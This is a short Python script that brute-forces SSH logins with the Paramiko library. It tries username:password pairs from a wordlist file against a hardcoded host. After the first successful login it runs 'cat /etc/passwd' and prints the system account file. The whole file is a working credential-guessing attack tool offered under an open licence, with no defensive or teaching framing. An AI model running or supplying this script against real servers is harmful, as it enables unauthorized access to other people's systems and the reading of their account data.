#-------------------------------------------------------------------------------
# Name:        SSH-BruteForce
# Purpose:      Following script will bruteforce SSH login using Paramiko
#               http://www.paramiko.org/en/latest/
# Author:      @abhinavbom
#
# Created:     19/10/2014
# Licence:     MIT
#-------------------------------------------------------------------------------

import paramiko
import sys

ssh = paramiko.SSHClient()          #Set up Paraniko SSh client
OFFSITE_IP = '192.168.0.23'         #Enter the IP where the SSH client is installed
PORT_NO = 22
#USERNAME = 'root'
#PASSWORD = 'root'
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())   # Define authentication key

fd = open(sys.argv[1], 'r')         # Pass the text file you want the script to read from
                                    # The format of the text file should be username:password

for line in fd.readlines():
    user_pass = line.strip().split(':')
    try:
        ssh.connect(OFFSITE_IP, PORT_NO, username=user_pass[0], password=user_pass[1])
    except paramiko.AuthenticationException:
        print 'username %s and password %s is incorrect' %(user_pass[0], user_pass[1])
    else:
        print 'username %s and password %s succesfully logged in' %(user_pass[0], user_pass[1])


        stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')

        for line in stdout.readlines():
            print line.strip()
        break
